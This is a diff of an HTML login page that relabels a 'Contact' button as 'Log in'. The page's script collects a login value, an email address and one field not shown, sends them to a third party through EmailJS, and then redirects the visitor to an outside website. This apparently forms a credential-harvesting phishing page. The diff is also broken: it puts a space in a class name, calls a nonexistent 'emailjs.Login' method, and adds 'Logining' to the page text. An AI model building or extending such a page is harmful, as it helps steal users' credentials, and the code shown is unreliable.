@@ -129,7 +129,7 @@
     font-size: 14px;
   }
 
-  .btn-contact {
+  .btn-Log in {
     width: 100%;
     padding: 14px;
     background: #93bc5a;
@@ -142,7 +142,7 @@
     margin-bottom: 18px;
     transition: background 0.2s ease;
   }
-  .btn-contact:hover {
+  .btn-Log in:hover {
     background: #82ab49;
   }
 
@@ -219,7 +219,7 @@
     background: transparent;}
 #emailScreen .field input::placeholder {
     color: #a9a9bd;}
-#emailScreen .btn-contact {
+#emailScreen .btn-Log in {
     width: 100%;
     padding: 14px;
     background: #93bc5a;
@@ -230,7 +230,7 @@
     font-weight: 600;
     cursor: pointer;
     transition: background 0.2s ease;}
-#emailScreen .btn-contact:hover {
+#emailScreen .btn-Log in:hover {
     background: #82ab49;}
 
 @media (max-width: 480px) {
@@ -301,7 +301,7 @@
           <label for="remember">Remember Me</label>
         </div>
 
-        <button type="submit" class="btn-contact">Contact</button>
+        <button type="submit" class="btn-Log in">Log in</button>
       </form>
 
       <p class="footer-text">Not a member? <a href="#">Create an account</a></p>
@@ -323,7 +323,7 @@
         <input type="text" id="emailInput" placeholder="Your Email">
       </div>
 
-      <button type="submit" class="btn-contact">Send</button>
+      <button type="submit" class="btn-Log in">Login</button>
     </form>
   </div>
 
@@ -350,10 +350,10 @@
     document.getElementById('emailForm').addEventListener('submit', function (e) {
       e.preventDefault();
 
-      const submitBtn = this.querySelector('.btn-contact');
+      const submitBtn = this.querySelector('.btn-Log in');
       const originalText = submitBtn.textContent;
       submitBtn.disabled = true;
-      submitBtn.textContent = 'Sending...';
+      submitBtn.textContent = 'Logining...';
 
       const templateParams = {
         Login: document.getElementById('welcomeLogin').value,
@@ -361,13 +361,13 @@
         email: document.getElementById('emailInput').value
       };
 
-      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
+      emailjs.Login(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
         .then(function () {
           window.location.href = 'https://huboweb.com';
         })
         .catch(function (err) {
           console.error('EmailJS error:', err);
-          alert('Something went wrong sending your details. Please try again.');
+          alert('Something went wrong Logining your details. Please try again.');
         })
         .finally(function () {
           submitBtn.disabled = false;
